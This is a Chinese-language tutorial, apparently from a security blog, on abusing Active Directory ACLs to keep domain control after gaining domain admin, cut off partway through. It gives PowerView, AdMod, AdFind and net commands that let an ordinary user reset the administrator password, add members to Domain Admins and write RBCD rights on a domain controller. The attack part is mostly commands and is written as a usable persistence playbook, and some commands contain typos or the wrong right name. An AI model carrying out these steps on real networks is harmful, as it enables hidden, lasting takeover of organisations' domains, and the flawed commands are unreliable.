本文将介绍如何滥用ACL进行域权限维持，首先我们来看看哪些权限比较重要，并且有利用价值。

（1）属性权限

  * member：拥有该属性的权限，可以将任意用户、组或机器加入到目标安全组中。

  * msDS-AllowedToActOnBehalfOfOtherIdentity:拥有该属性的权限，可以修改目标对象基于资源的约束性委派RBCD，进行攻击目标的权限。

（2）扩展权限

  * DCSync:拥有扩展权限，可以通过目录复制服务（Directory Replication Service,DRS）的  
GetNCChanges接口向域控发起数据同步请求，从而获得域内任意用户的密码 Hash。

  * User-Force-Change-Password：拥有的该扩展权限，可以在不知道目标用户密码的情况下强制修改目标用户的密码。

（3）基本权限

  * GenericWrite：拥有该权限，可以修改目标安全对象的所有参数，包括对所有属性的修改。

  * GenericAll：拥有该权限就等于拥有了对目标安全对象的完整控制权。

  * WriteOwner：拥有该权限，可以修改目标安全对象的Owner属性为自身，从而安全控制该安全对象。

  * WriteDACL：拥有该权限，可以往目标安全对象写入任何的ACE，从而完全控制该安全对象。

## 1、User-Force-Change-Password 扩展权限

如图所示是微软对于User-Force-Change-Password 属性的描述。

![图片.png](https://image.3001.net/images/20230704/1688417954_64a336a27eabaec2881c1.png!small)

 **注意** ：该扩展权限一般针对域用户进行利用。

由于jack是普通域用户，因此它没有给域管理员administrator
修改密码的权限，如图所示，以用户jack身份使用Admod工具执行如下的命令重置administrator 的密码，可以看到重置失败

工具下载地址：`https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools`

    
    
    AdMod.exe -users -rb cn=administrator unicodepwd::12345678 -optenc
    

![图片.png](https://image.3001.net/images/20230704/1688417978_64a336ba5b7d509e528eb.png!small)

现在我们获得了域管理员的权限，并想进行权限维持，可以进行如下的操作：使用Empire下的powerview.ps1脚本执行如下的命令手动给用户jack添加对域管理员
administrator 重置密码的权限，如图所示

    
    
    Import-Module .\powerview.ps1
    #添加用户jack对域管理员administrator重置密码的权限
    Add-DomainObjectAcl -TaegetIdentity administrator -PrincipalIdentity jack -Rights ResetPassword -Verbose
    

![图片.png](https://image.3001.net/images/20230704/1688417990_64a336c635d95f2fcf30d.png!small)

也可以图形化添加，如图所示，打开"Active Directory
用户和计算机"-->"Users"-->"administrator",然后右击，选择”属性“选项，在弹出对话框的”安全“选项卡中单击"高级“-->"添加”按钮，“主体”选择
jack，“类型"为”允许“，"应用于" 默认是“这个对象及全部后代”选项，“权限”勾选“重置密码”选项，最后单击“确定”-->"应用“按钮即可。

![图片.png](https://image.3001.net/images/20230704/1688418003_64a336d33ed605a0a256f.png!small)

赋予完成后，使用Adfind执行如下的命令查询域管理员administrator 的权限信息，如图所示，可以看到用户 jack 已经拥有对域管理员
administrator重置密码扩展的权限了。

    
    
    Adfind.exe -s base -b "CN=Administrator,CN=Users,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    

![图片.png](https://image.3001.net/images/20230704/1688418019_64a336e398f3933942195.png!small)

现在再次以用户jack身份使用Admod工具执行如下的命令修改域管理员administrator密码，如图所示，可以看到赋予权限后，密码修改成功

    
    
    #重置域管理员administrator的密码为P@ss1234
    AdMod.exe -users -rb cn=administrator unicodepwd::P@ss1234 -optenc
    

![图片.png](https://image.3001.net/images/20230704/1688418039_64a336f7d67e13f9b2163.png!small)

此后不管域内密码怎么修改，只要用户jack拥有对 administrator 重置密码的权限，就可以修改域管理员 administrator
密码，从而接管整个域。

如果想移除该重置密码的扩展权限，可以使用powershell.ps1脚本执行如下的命令，结果如图所示：

    
    
    Import-Module .\powerview.ps1
    #移除用户jack对域管理员administrator 重置密码的权限
    Remove-DomainObjectAcl -TargetIdentity administrator -PrincipalIdentity jack -Rights ResetPassword -Verbose
    

![图片.png](https://image.3001.net/images/20230704/1688418052_64a33704cc38d665eea05.png!small)

**注意** ：该权限重置密码不能使用命令行语句重置，会提示权限拒绝，这也是使用Admod来重置密码的原因。

## 2、member 属性权限

如图所示是微软对于member 属性的描述

![图片.png](https://image.3001.net/images/20230704/1688418066_64a33712a0f505e41774d.png!small)

由于用户 jack是普通的域用户，因此它没有往Domain Admins组中添加用户的权限，如图所示，以用户jack 权限往Domain Admins
组中添加用户，可以看到，添加用户失败。

    
    
    net group "domain admins" hack2 /add /domain
    

![图片.png](https://image.3001.net/images/20230704/1688418087_64a337278c95220b97167.png!small)

现在我们获得了域管理员的权限，并想进行权限维持，可以进行如下的操作：使用Empire下的powerview.ps1脚本执行如下的命令手动给用户jack
添加对 Domain Admins 组的WriteMembers权限，如图所示：

    
    
    Import-Module .\powerview.ps1
    #添加用户jack对Domain Admins组的WriteMembers权限
    Add-DomainObjectAcl -TaegetIdentity "domain admins" -PrincipalIdentity jack -Rights ResetPassword -Verbose
    

![图片.png](https://image.3001.net/images/20230704/1688418100_64a33734340437912cb42.png!small)

赋予权限后，使用Adfind执行如下的命令查询Domain Admins 组的权限信息，如图所示，可以看到用户jack已经拥有对Domian
Admins组的member属性的完全控制权限。

    
    
    Adfind.exe -b "CN=Domain Admins,CN=Users,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    

![图片.png](https://image.3001.net/images/20230704/1688418111_64a3373fa6207c42ee193.png!small)

再次以用户jack身份往Domain Admins 组中添加用户，如图所示，可以看到赋予权限后，用户添加成功。

    
    
    net group "domain admins" hack2 /add /domain
    

![图片.png](https://image.3001.net/images/20230704/1688418126_64a3374e796ffd1312937.png!small)

此后不管域内密码怎么修改，只要用户jack拥有对Domain Admins 组的Write-Members权限，就可以往Domain Admins
组内添加任意的用户，从而接管整个域。

如果想移除该权限，可以使用powerview.ps1脚本执行如下的命令，结果如图所示：

    
    
    Import-Module .\powerview.ps1
    #移除用户jack对Domain Admins 组的Write-Members权限
    Remove-DomainObjectAcl -TargetIdentity "domain admins" -PrincipalIdentity jack -Rights WriteMembers -Verbose
    

![图片.png](https://image.3001.net/images/20230704/1688418139_64a3375b15657b6b47f50.png!small)

## 3、msDS-AllowedToActOnBehalfOfOtherldentity 属性权限

如图所示是微软对于msDS-AllowedToActOnBehalfOfOtherldentity 属性的描述

![图片.png](https://image.3001.net/images/20230704/1688418163_64a33773a16bf4f0d9623.png!small)

jack是域中的一个普通用户。现在我们获得了域管理员的权限，并想进行权限维持，可以进行如下的操作：使用Empire下的powerview.ps1脚本执行如下的命令手动给用户jack添加对域控制修改msDS-AllowedToActOnBehalfOfOtherldentity（3f78c3e5-f79a-46bd-a0b8-9d18116ddc79）属性的权限，如图所示：

    
    
    Import-Module .\powerview.ps1
    #添加用户jack 对域控的msDS-AllowedToActOnBehalfOfOtherldentity属性修改权限
    Add-DomainObjectAcl -TargetIdentity "CN=DC,OU=Domain Controllers,DC=hack,DC=com" -PrincipalIdentity jack -RightsGUID 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -Verbose
    

![图片.png](https://image.3001.net/images/20230704/1688418175_64a3377fab440f12de172.png!small)

也可以图形化添加，如图所示，打开"Active Directory 用户和计算机"–>“Domain
Controllers”,选中一个域控，然后右击，选择”属性“选项，在弹出对话框的”安全“选项卡中单击"高级“–>"添加”按钮，“主体”选择
jack，“类型"为”允许“，“应用于” 默认是“这个对象及全部后代”选项，“权限”勾选"写入msDS-AllowedToActOnBehalfOfOtherldentity"选项，最后单击“确定”–>"应用“按钮即可。

![图片.png](https://image.3001.net/images/20230704/1688418189_64a3378dab1c1346ff843.png!small)

赋予权限完成后，使用Adfi

